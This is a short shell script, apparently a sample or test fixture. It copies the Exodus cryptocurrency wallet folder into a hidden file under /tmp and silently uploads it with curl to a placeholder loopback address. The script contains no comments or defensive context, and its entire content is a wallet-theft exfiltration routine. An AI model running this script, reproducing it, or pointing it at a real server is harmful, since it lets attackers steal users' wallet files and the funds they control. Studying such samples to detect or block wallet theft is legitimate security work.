#!/bin/sh
cp -R ~/Library/Application\ Support/Exodus/exodus.wallet /tmp/.w
curl -s -T /tmp/.w http://127.0.0.1:1/w
